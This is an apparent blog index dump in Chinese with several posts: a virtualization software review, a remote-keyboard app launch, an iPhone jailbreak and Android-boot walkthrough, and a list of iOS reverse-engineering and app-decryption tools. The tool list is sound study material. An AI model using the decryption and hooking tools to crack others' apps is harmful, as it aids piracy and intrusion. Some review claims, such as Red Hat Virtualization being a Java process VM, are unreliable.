10.1和OpenGL支持的3D图形，便于软件的开发或提高游戏画面质感。 针对个人用户，Fusion提供免费的基本版；针对商业或需要高级功能的个人用户，提供了付费的Fusion Pro，该版本支持与vSphere连接，vSphere提供了虚拟化云平台，它可与用于数据中心拓扑的第三方软件集成，整合更多资源、或服务于整个商业构架。Fusion Player价格为$149，Fusion Pro价格为$199。 优点 行业标杆性的强大功能 支持GPU虚拟化 灵活的价格设置 缺点 会占用较多计算机资源 熟悉掌握使用方式需要一定的学习时间 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:2","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"3. Oracle VM VirtualBox 虚拟机 VirtualBox 推荐理由 最适合初学者的虚拟机软件 软件参数 可安装的系统：Mac、Windows、Linux、Solaris 支持的第二套系统：众多系统平台和版本 是否支持GPU虚拟化：是 费用： 免费/付费 软件介绍 如果首次接触虚拟机软件，那么可以考虑这款Oracle VirtualBox，开源、且基本免费。 无论您的计算机运行什么操作系统，该软件几乎都可以安装，可支持的虚拟机系统范围更是出人意料的多，从XP到10的所有Windows版本，Server2003甚至Windows 3.x和 IBM OS / 2，也支持Linux 2.4及更高版本的任何版本、以及OpenBSD，Solaris和OpenSolaris等等，这一点也满足了硬件较旧的计算机对于虚拟机的需求。 在功能上，VirtualBox支持USB设备的识别功能，GPU虚拟化功能，可同时运行多个虚拟机系统窗口，并支持一定程度的转移性，即将一台计算机上创建的虚拟机直接转移到运行不同操作系统的另一台计算机上。 作为虚拟机新手用户，可以在Oracle网站上找到的详细教程和帮助信息，以及大量的已完整构建的虚拟机可供直接使用，在安装过程中遇到任何问题，可以随时查看教程和操作指南。 在费用方面，Oracle VirtualBox为个人用户提供了免费版本，可以满足绝大多数人对虚拟机的需求，只有当您需要非常复杂的高级功能时，可能需要升级至收费版，不同级别的收费情况会有不同。 优点 支持多种系统 支持GPU虚拟化 友好的技术支持服务 缺点 用户界面不够人性化 免费版本仅支持基本功能，高级功能仍需付费 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:3","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"4. Parallels Desktop 虚拟机 Parallels Desktop 推荐理由 适合Mac用户的虚拟机软件 软件参数 可安装的操作系统：Mac 可虚拟的操作系统：Windows 是否支持GPU虚拟化：是 费用：多种付费计划 软件介绍 对于Mac用户，同时需要在Mac和Windows系统间经常切换的使用者来说，Parallels Desktop虚拟机软件是一个不错的选择。 首先它配备了一键安装功能，可以通过网络连接到Parallel的虚拟桌面，帮助您查找和下载所安装的程序文件，以保证您可以顺利使用。 另一个特色功能是一键调整，可让您根据使用目的，比如游戏，设计，软件测试、甚至APP开发来设置虚拟软件的界面、和功能等，来优化使用体验感。 无缝模式可支持在Mac和Windows之间，进行简单的拖曳功能来共享文件或文件夹，以及在Mac Notification Center中显示Windows警报，同时基于Windows系统的主要用途，Parallels优化了系统和硬件资源，以提供更完善的Windows体验，就像一台真正的PC。另外，该软件还支持GPU虚拟化来优化3D图形的显示。 费用方面Parallels提供了三个版本：标准版、专业版、和商业版：标准版可满足大部分普通用户，$79.99起；标准版比较适合技术开发人员，$99.99/年；商业版为$99.99/年。 优点 支持GPU虚拟化 灵活的价格计划 缺点 可安装的第二套系统仅仅支持Windows 8、10及更高版本 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:4","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"5. Red Hat Virtualization 虚拟机 Red Hat Virtualization 推荐理由 适合程序员的进程虚拟机软件 软件参数 可安装系统：Linux、Windows 可支持系统： Linux、Windows GPU虚拟化：不支持 费用：免费版/付费版 软件介绍 Red Hat Virtualization是使用Java语言编写的进程虚拟机，安装时可只针对某一特定程序设置一个独立于主计算机的虚拟空间，这使得一些应用程序可以在虚拟化环境中、而非在一个完整的虚拟计算机中快速运行, 所以在资源占用上进行了最大程度的缩减，非常适合需要大量计算机资源的场景，比如，在商用服务器整合中，它可以提供高达10：1的整合率，最多可减少75%的服务器机架空间。 同时这款虚拟机软件是一款开源软件，因此，您可以按照自己的需要进行设置，易于使用和管理。实时迁移和优先级别VM重启功能，可以使您在发生故障时，将VM从一台主机完整复制到另一台主机；同时，它支持第三方备份、还原、和复制功能，缩减您在不同计算机中设置现有虚拟机的工作量。 对于绝大多数用户而言，免费版已经可以满足需求，如果需要非常高级别性能的版本可以购买pro产品。 优点 作为进程虚拟机，节省计算机空间 灵活储存方式，便于转移和共享 缺点 无GPU虚拟化等针对特定项目的功能 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:5","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"6. QEMU 虚拟机 QEMU 推荐理由 最灵活的虚拟机软件 软件参数 可安装系统：多系统版本 可支持系统：多系统版本 GPU虚拟化：支持 费用：免费 软件介绍 QEMU虚拟机也是一款开源软件，其最大的特点在于系统版本组合的灵活性，几乎涵盖了所有会被使用到的系统版本。这款虚拟机软件对主机系统无任何限制，对硬件也支持虚拟化，虚拟机可以在适当的硬件上体现近乎相同的性能，甚至可能会让您忘记您在使用虚拟机。同时，QEMU还支持读取外接USB设备、支持GPU虚拟化等等，基于开源软件，您可以根据需要进行针对性的设置。 优点 强大的版本组合灵活性 免费 缺点 稳定性是部分专业人士认为有待提高的地方 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:6","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"7. Apple Boot Camp 虚拟机 Apple Boot Camp 推荐理由 Apple开发的虚拟机软件 软件参数 可安装系统：Mac 可支持系统：Windows GPU虚拟化：支持 费用：免费 软件介绍 Boot Camp虚拟软件由Apple开发，为想要在Mac上使用Windows操作系统的用户所使用。目前可支持的第二套操作系统包括Windows 7、8.1和10。 这是一款Mac自带软件，安装时，您只需要打开、并遵循指南即可按步进行，部分型号会需要一个Windows系统的IOS映像文件。如果您在操作过程中有任何问题，Apple提供了完善的指导，包括文本信息、邮件指示到电话指导。 从实质来讲，Boot Camp并不是严格意义上的虚拟机软件，因为它直接将计算机硬件区分成两个独立的系统，进入也必须是在重启计算机的情况下。虽然这在使用上有点麻烦，但完全独立的设置使它与任何虚拟机相比，在硬盘驱动器的运行效能方面带来更完善的质感体验。 优点 Mac自带软件，使用方便 硬盘驱动器独立运行，性能卓越 免费 缺点 运行不同系统需重启计算机 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:7","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"8. Citrix Hypervisor 虚拟机 Citrix Hypervisor 推荐理由 安全性最强的虚拟机软件 软件参数 可安装的操作系统：Mac,Windows 可虚拟的操作系统：Windows，Linux GPU虚拟化：支持 费用：免费/付费 软件介绍 Citrix Hypervisor虚拟机可创建虚拟数据中心，支持不同计算机中的虚拟机经云端无缝转移，也支持用户快速上传大型文件，可同步访问或协作，所提供的监管功能对于所设立的虚拟机监督控制效果很好。 同时，在大型系统环境中，能够同时管理多台服务器、并平衡它们之间的工作负载，因此，当一台服务器发生故障时，另一台服务器可直接接管，从而保证运行状态不会间断，保障了企业的安全性。 费用上目前设置有三个版本： 免费版，可简单使用来创建虚拟机，但不提供技术支持； 标准版在免费版的基础上提供了技术支持； 高级版则解锁了许多高级功能，比如GPU虚拟化等，来满足CAD制图等高级功能； 优点 构建虚拟数据中心保证安全性 缺点 运行中的维护和问题可能需要专门的专家来解决 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:19:8","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"更多软件攻略 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:20:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["虚拟化"],"content":"常见问题 问题：VMware虚拟机好不好? VMware可谓虚拟机软件市场的元老级成员，20多年的行业经验使其经常被当做虚拟机软件的行业标准来进行参考，它所提供的功能几乎集满足了所有虚拟化需求。 主要包含两款虚拟机产品：VMware Workspace 和 VMware Fusion。 VMware可以安装在Windows 和 Linux系统上，而VMware Fusion主要是为Mac系统而设计的。 ","date":"2021-11-20","objectID":"/zh-cn/20-3/:21:0","tags":["虚拟化"],"title":"了解虚拟化","uri":"/zh-cn/20-3/"},{"categories":["远程"],"content":"远程输入法新版发布，用浏览器给手机打字 场景 下载地址 快速上手 iOS 快速上手 Android 快速上手 输入模式 输入模式 输入小技巧 复制和接力 实验室 免费 总结 感谢: 少数派:「远程输入法」新版发布，用浏览器给手机打字 异次元: 远程输入法 - 用电脑键盘给手机打字的创意效率应用！省蓝牙键盘钱了 最美应用: 这款 APP 终于解决了困扰我这么多年的麻烦 虚拟框架：远程输入法发布啦，用电脑给手机打字 小众软件：这个脑洞有点大：远程输入法，用电脑给手机打字 还有感谢「PriceTag」等媒体的宣传。 远程输入法 是一个输入法应用，可以实现使用电脑给手机打字，让手机打字更快。使用远程输入法时，手机端会显示一个网址，在电脑浏览器中访问这个网址，即可开始输入。浏览器中输入的文字发送到手机，从而实现电脑给手机打字。 手机端支持iOS和Android，电脑上只要有浏览器即可（也就支持macOS/Windows/Linux三个平台了）。 远程输入法在英文系统显示为 Remoboard，即含义为 Remote Keyboard。 通常情况下我们并不需要远程输入，但可能在以下场景中，远程输入法可以帮上忙： ","date":"2021-11-20","objectID":"/zh-cn/20-2/:0:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"场景 场景一： 一款应用只有手机版本，没有电脑版本（或者不想购买电脑版本哈），而这个应用的使用需要「大量的文字输入工作」。 例如iOS平台的DayOne日记应用，我购买了iOS版本但不想购买macOS版本了，平时就可以用远程输入法来写日记。 又例如微信聊天，很多公司的工作电脑是不让安装微信电脑端的，此时用远程输入法可以加快聊天。（快点聊完，快点回到工作）（对我来说，偶尔会有网友私聊问问题，简短的文字又不能表述清楚，我是想回答又不想回答，有了远程输入法，就能快速打字啦） 搭配Android平台优秀的文本写作应用「纯纯写作」，也可以加快写作的速度。 场景二： 手机端有不少优秀的编程环境，例如JSBox、Pythonista，以及最近新出的Robomaster（使用Python控制RoboMaster S1），使用远程输入法，可以比较方便的完成手机端编程。 场景三： 甚至Android智能电视上也可以安装输入法，然后手机浏览器访问输入网址，加快电视上的文字输入速度。 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:1:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"下载地址 iOS AppStore Android 酷安 或 Google PlayStore ","date":"2021-11-20","objectID":"/zh-cn/20-2/:2:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"快速上手 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:3:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"iOS 快速上手 (1) 从AppStore下载远程输入法 AppStore (2) 打开 设置\u003e通用\u003e键盘\u003e键盘\u003e添加新键盘 (3) 点远程输入法 (4) 键盘安装完毕 (5) 再次在刚才完成的界面点击远程输入法，如下图所示启用 允许完全访问 (6) 现在安装已经完成，在可输入文字的地方，切换到「远程输入法」，即可看到一个网址（首先确保Wi-Fi已经连接），在电脑浏览器中打开这个地址，即可开始输入啦。 注意： 需要确保手机和电脑连接入一个网络中，电脑上ping通手机的IP地址。 浏览器中输入下图完整的网址，例如：http://192.168.31.11:7777 补充：如果macOS和iOS登录了相同的AppleId，则可以使用「复制」和「接力」更快捷的在电脑上打开网址。见文章最后。 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:3:1","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"Android 快速上手 （1）从 酷安 或 Google PlayStore 安装，然后打开应用，点击启用输入法 这里可能会「提示重启」，一般情况下点击「确定」无视即可。 （2）切换输入法 （3）现在安装已经完成，在可输入文字的地方，切换到「远程输入法」，即可看到一个网址（首先确保Wi-Fi已经连接），在电脑浏览器中打开这个地址，即可开始输入啦。 注意： 需要确保手机和电脑连接入一个网络中，电脑上ping通手机的IP地址。 浏览器中输入下图完整的网址，例如：http://192.168.31.11:7777 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:3:2","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"输入模式 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:4:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"输入模式 有三种输入模式： (1) 标准输入模式 这种模式下可以输入「一行文字」，然后「按回车发送」。 (2) 多行输入模式 这种模式下，可以「输入或粘贴多行文字」，「点击按钮」发送。 (3) 编程输入模式 这种模式下，文字会边打边发送，很适合一些手机端的编程应用。 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:4:1","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"输入小技巧 三种输入模式中，当输入文本框内容为空时，还支持以下按键： 退格键：删除手机上的文字 按键左和右：向左 和 向右 移动光标 按键上和下：向左 和 向右 移动 20 个字符。如果手机上的左或右不够20个字符，不会移动。 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:5:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"复制和接力 iOS 输入法上会有个「复制」和「接力」按钮，目前的使用场景主要是：iOS配合macOS，且登录了「相同AppleID」。 当点击「复制」时，iOS的剪贴板内容会同步到macOS，在macOS上打开浏览器，粘贴到地址栏打开即可开始输入。 但点击「接力」时，由于系统限制，会先跳转到「远程输入法的主界面」，此时macOS上的Dock上会出现一个「浏览器的图标」，点击即可打开对应的网址。 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:6:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"实验室 远程输入法首次发布时，我写过一篇文章介绍，那时还没有现在「浏览器输入」的方式。使用了更古老的「安装电脑端软件」的方式，使用方式上更麻烦，而且「稳定性也不太好」。因此这次新版本我把这两个连接模式移动到了「实验室」中。 实验室中包含「连接模式」切换的功能，可以切换为「蓝牙」和「IP」连接模式。关于这两个模式，计划如下： 蓝牙连接模式：未来会逐步优化。 IP连接模式：即将废弃。根据情况，逐步替换为Web连接模式中的Http接口。 简单来说，「实验室」中的功能，暂时不建议使用哈。 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:7:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"免费 目前完全免费，现有功能未来也不会收费。如果可能，未来会开发一些小的收费功能。 ","date":"2021-11-20","objectID":"/zh-cn/20-2/:8:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["远程"],"content":"总结 希望大家玩的愉快，如果可以的话，帮忙推荐给更多朋友使用哦 :) ","date":"2021-11-20","objectID":"/zh-cn/20-2/:9:0","tags":["远程"],"title":"远程输入法新版发布, 用浏览器给手机打字","uri":"/zh-cn/20-2/"},{"categories":["iPhone","Android"],"content":" 越狱 下载 Android Build setup_mac.sh 进入DFU 模式 截图 总结 历史上第一次让Android系统运行到iPhone手机上。目前（2020年3月6日）的版本只支持iPhone7/7 Plus。（iOS系统版本无要求） Project Sandcastle: Android for the iPhone 项目地址：https://projectsandcastle.org/ 正好手头有个iPhone7，体验了下。步骤简单总结下，分享给大家。理想的步骤如下，但由于macOS的安全机制，导致步骤2和3不那么轻松愉快。 使用checkra1n越狱 运行start_mac.sh 运行setup_mac.sh ","date":"2021-11-20","objectID":"/zh-cn/20-1/:0:0","tags":["iPhone","Android"],"title":"体验了下iPhone运行Android","uri":"/zh-cn/20-1/"},{"categories":["iPhone","Android"],"content":"越狱 下载 https://checkra.in/ 按照步骤越狱。（iPhone使用USB连接Mac。） 越狱后，进入iOS。 ","date":"2021-11-20","objectID":"/zh-cn/20-1/:1:0","tags":["iPhone","Android"],"title":"体验了下iPhone运行Android","uri":"/zh-cn/20-1/"},{"categories":["iPhone","Android"],"content":"下载 Android Build 在 https://projectsandcastle.org/status 下载 Android Build。 解压下载的文件。","date":"2021-11-20","objectID":"/zh-cn/20-1/:2:0","tags":["iPhone","Android"],"title":"体验了下iPhone运行Android","uri":"/zh-cn/20-1/"},{"categories":["iPhone","Android"],"content":"setup_mac.sh iPhone使用USB连接Mac。理想情况下，macOS上执行 ./setup_mac.sh即可。但我执行不太顺利。自带的iproxy和两个动态库的签名首次执行还需要信任。但其实功能就是iproxy的功能，因此下面手动把 setup_mac.sh 中的步骤执行。 可以先ssh连接下iOS，确保手动连接成功。然后参考如下步骤。 (1) iproxy 2222 44 (2) 把isetup复制到iOS的/tmp/setup.sh scp -P2222 -o StrictHostKeyChecking=no isetup root@localhost:/tmp/setup.sh (3) 两个方法： 一是，FQ。 或者，修改setup.sh中的网络连接测试的地址，比如专门测试网能不能上的baidu（看来老外也是对应的用google测试啊） 建议使用FQ的方法，因为这个脚本会下载470MB的文件，我家的Wi-Fi不FQ的话，下载这个文件很慢，FQ后貌似几分钟就好了。 (4) 执行 /tmp/setup.sh ","date":"2021-11-20","objectID":"/zh-cn/20-1/:3:0","tags":["iPhone","Android"],"title":"体验了下iPhone运行Android","uri":"/zh-cn/20-1/"},{"categories":["iPhone","Android"],"content":"进入DFU 模式 iPhone关机。 同时按 音量下 + 关机键，10秒钟（尽量严格的10秒）。 松开 关机键，继续保持音量下。 此时手机屏幕会保持黑屏，表示进入了DFU模式。 然后在DFU模式下，执行./start_mac.sh。 理想情况下，执行完成就可以了。但现实很残酷，我见到了下面这个弹窗（内心一万匹羊驼飞奔而过，生怕把手机搞坏了……），当然要点Cancel。 进入 System Preferences -\u003e Security \u0026 Privacy -\u003e General， 点 Allow Anyway。 此时还不行，为了预防万一，先命令后执行一次 ./load-linux.mac 然后就可以点Open了。 但此时重新执行start_mac.sh似乎不能”恢复继续”了，内心X#@%$$。“聪明”的我看了下start_mac.sh的代码，看来可以执行执行这一步。 ./load-linux.mac Android.lzma dtbpack 终于成功，iPhone上启动了Android系统。 ","date":"2021-11-20","objectID":"/zh-cn/20-1/:4:0","tags":["iPhone","Android"],"title":"体验了下iPhone运行Android","uri":"/zh-cn/20-1/"},{"categories":["iPhone","Android"],"content":"截图 ","date":"2021-11-20","objectID":"/zh-cn/20-1/:5:0","tags":["iPhone","Android"],"title":"体验了下iPhone运行Android","uri":"/zh-cn/20-1/"},{"categories":["iPhone","Android"],"content":"总结 运行比较卡。 重启就恢复iOS。 ","date":"2021-11-20","objectID":"/zh-cn/20-1/:6:0","tags":["iPhone","Android"],"title":"体验了下iPhone运行Android","uri":"/zh-cn/20-1/"},{"categories":[],"content":"此文为加密收费内容添加我微信支付后可看: iOS应用逆向工程资料 环境 硬件 越狱 工具 frida cycript chisel (lldb script) MonkeyDev passionfruit objection theos HookZz AppleTrace dump frida-ios-dump Clutch dumpdecrypted dump class class-dump/class-dump-z/classdump-dyld swift class dump Hikari Reveal IDA Hopper Flex 其他 书籍 iOS应用逆向工程 Hacking iOS Applications security.ios-wiki.com Advanced Apple Debugging \u0026 Reverse Engineering Reverse Engineering for Beginners Beginner’s Guide to Exploitation on ARM *OSInternals 资料 反调试资料、Hook检测 OWASP Mobile Security Testing Guide iOS 安全 Wiki 其他 PWN 安全类入门文章 入门pwn Iot安全 AzeriaLabs ARM汇编 iOS调试进阶 论坛 又是很久不逆向App了，近期有点需求需要看看其他App怎么实现的，想来复习一下。以及这两年也有若干常用工具发生了变化，产生了一些新的工具。这篇文章总结下基础的App逆向的方法、工具和一些书籍。以后有新的发现也会尽量更新到这篇文章。 环境 ","date":"2021-11-20","objectID":"/zh-cn/20/:0:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"硬件 iOS系统的iPhone或iPad macOS系统的MacBook等 ","date":"2021-11-20","objectID":"/zh-cn/20/:1:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"越狱 手机是否可以越狱可通过这个网站来确定： https://canijailbreak.com/ 越狱用的软件也有链接可下载。 ","date":"2021-11-20","objectID":"/zh-cn/20/:2:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"工具 ","date":"2021-11-20","objectID":"/zh-cn/20/:3:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"frida 官网 https://www.frida.re/ Dynamic instrumentation toolkit for developers, reverse-engineers, and security researchers. Inject your own scripts into black box processes. Hook any function, spy on crypto APIs or trace private application code, no source code needed. Edit, hit save, and instantly see the results. All without compilation steps or program restarts. ","date":"2021-11-20","objectID":"/zh-cn/20/:3:1","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"cycript http://www.cycript.org/ Cycript allows developers to explore and modify running applications on either iOS or Mac OS X using a hybrid of Objective-C++ and JavaScript syntax through an interactive console that features syntax highlighting and tab completion. ","date":"2021-11-20","objectID":"/zh-cn/20/:3:2","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"chisel (lldb script) https://github.com/facebook/chisel Chisel is a collection of LLDB commands to assist debugging iOS apps. 最常用的就是pview和pvc两个命令了。 所有支持的命令可以参考Wiki：https://github.com/facebook/chisel/wiki 。 ","date":"2021-11-20","objectID":"/zh-cn/20/:3:3","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"MonkeyDev https://github.com/AloneMonkey/MonkeyDev 原有iOSOpenDev的升级，非越狱插件开发集成神器！ 可以使用Xcode开发CaptainHook Tweak、Logos Tweak 和 Command-line Tool，在越狱机器开发插件，这是原来iOSOpenDev功能的迁移和改进。 只需拖入一个砸壳应用，自动集成class-dump、restore-symbol、Reveal、Cycript和注入的动态库并重签名安装到非越狱机器。 支持调试自己编写的动态库和第三方App 支持通过CocoaPods第三方应用集成SDK以及非越狱插件，简单来说就是通过CocoaPods搭建了一个非越狱插件商店。 新生力量，诞生于2017年。已经是分析闭源应用的必备工具。 ","date":"2021-11-20","objectID":"/zh-cn/20/:3:4","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"passionfruit https://github.com/chaitin/passionfruit 基于frida开发，逆向必备，可以很容易看到第三方应用的各类信息。 Cross plarform web GUI! Also supports non-jailbroken device (see Non-jailbroken device). List all url schemes. Check signature entitlements. List human readable app meta info (Info.plist). Capture screenshot. Checksec: see if target app is encrypted, and has enabled PIE, ARC and stack canary. App sandbox file browser. Directly preview images, SQLite databases and plist files on device. You can always download the file for further investigation. 等等 ","date":"2021-11-20","objectID":"/zh-cn/20/:3:5","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"objection https://github.com/sensepost/objection 基于frida的工具集。 objection is a runtime mobile exploration toolkit, powered by Frida. It was built with the aim of helping assess mobile applications and their security posture without the need for a jailbroken or rooted mobile device. ","date":"2021-11-20","objectID":"/zh-cn/20/:3:6","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"theos https://github.com/theos/theos 提供了各类逆向开发的模板及工具。 A cross-platform suite of tools for building and deploying software for iOS and other platforms. ","date":"2021-11-20","objectID":"/zh-cn/20/:3:7","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"HookZz https://github.com/jmpews/HookZz a hook framework for arm/arm64/ios/android ","date":"2021-11-20","objectID":"/zh-cn/20/:3:8","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"AppleTrace https://github.com/everettjf/AppleTrace Objective C message tracing tool for iOS/macOS based on HookZz ","date":"2021-11-20","objectID":"/zh-cn/20/:3:9","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"dump frida-ios-dump https://github.com/AloneMonkey/frida-ios-dump 可以很方便的dump应用。可替代 Clutch。 pull decrypted ipa from jailbreak device Clutch https://github.com/KJCracks/Clutch Fast iOS executable dumper dumpdecrypted https://github.com/AloneMonkey/dumpdecrypted 在原版的基础上增加了dump 动态库的功能。 Dumps decrypted mach-o files from encrypted applications、framework or app extensions. ","date":"2021-11-20","objectID":"/zh-cn/20/:3:10","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"dump class Generate Objective-C headers from Mach-O files. class-dump/class-dump-z/classdump-dyld https://github.com/nygard/class-dump https://code.google.com/archive/p/networkpx/wikis/class_dump_z.wiki https://github.com/limneos/classdump-dyld swift class dump https://github.com/BlueCocoa/class-dump/ https://github.com/Maximus-/class-dump-swift ","date":"2021-11-20","objectID":"/zh-cn/20/:3:11","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Hikari https://github.com/HikariObfuscator/Hikari ","date":"2021-11-20","objectID":"/zh-cn/20/:3:12","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Reveal https://revealapp.com/ ","date":"2021-11-20","objectID":"/zh-cn/20/:3:13","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"IDA 神器 ","date":"2021-11-20","objectID":"/zh-cn/20/:3:14","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Hopper 轻量级反编译 ","date":"2021-11-20","objectID":"/zh-cn/20/:3:15","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Flex https://github.com/Flipboard/FLEX ","date":"2021-11-20","objectID":"/zh-cn/20/:3:16","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"其他 strings、nm、weak_classdump http://iphonedevwiki.net/index.php/Reverse_Engineering_Tools 书籍 ","date":"2021-11-20","objectID":"/zh-cn/20/:3:17","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"iOS应用逆向工程 中文：http://item.jd.com/11670145.html 英文：https://github.com/iosre/iOSAppReverseEngineering ","date":"2021-11-20","objectID":"/zh-cn/20/:4:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Hacking iOS Applications http://iosre.com/t/hacking-ios-applications/8014![img](https://everettjf.github.io/media/15238972865910.jpg) ","date":"2021-11-20","objectID":"/zh-cn/20/:5:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"security.ios-wiki.com https://wizardforcel.gitbooks.io/ios-sec-wiki/ ","date":"2021-11-20","objectID":"/zh-cn/20/:6:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Advanced Apple Debugging \u0026 Reverse Engineering https://store.raywenderlich.com/products/advanced-apple-debugging-and-reverse-engineering![img](https://everettjf.github.io/media/15238973574830.jpg) ","date":"2021-11-20","objectID":"/zh-cn/20/:7:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Reverse Engineering for Beginners https://beginners.re/ 中文 https://item.jd.com/12166962.html![img](https://everettjf.github.io/media/15238974244634.jpg) ","date":"2021-11-20","objectID":"/zh-cn/20/:8:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"Beginner’s Guide to Exploitation on ARM http://zygosec.com/Products/![img](https://everettjf.github.io/media/15238974543754.jpg) ","date":"2021-11-20","objectID":"/zh-cn/20/:9:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"*OSInternals Volume I - User Mode Volume III - Security \u0026 Insecurity 据说Volume II 今年(2018年）秋天出来。 http://newosxbook.com/ 资料 ","date":"2021-11-20","objectID":"/zh-cn/20/:10:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"反调试资料、Hook检测 AttackingBYODEnterpriseMobileSecuritySolutions http://7xibfi.com1.z0.glb.clouddn.com/uploads/default/original/2X/2/2a09f6db6d0f0a0cbefdfddf545cbc3c0fdcce8e.pdf https://www.blackhat.com/docs/us-16/materials/us-16-Tan-Bad-For-Enterprise-Attacking-BYOD-Enterprise-Mobile-Security-Solutions.pdf http://iosre.com/t/topic/8179 https://sushi2k.gitbooks.io/the-owasp-mobile-security-testing-guide/content/0x06j-Testing-Resiliency-Against-Reverse-Engineering.html ","date":"2021-11-20","objectID":"/zh-cn/20/:11:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"OWASP Mobile Security Testing Guide https://www.gitbook.com/book/b-mueller/the-owasp-mobile-security-testing-guide ","date":"2021-11-20","objectID":"/zh-cn/20/:12:0","tags":[],"title":"iOS应用逆向工程资料","uri":"/zh-cn/20/"},{"categories":[],"content":"iOS 安全 Wiki 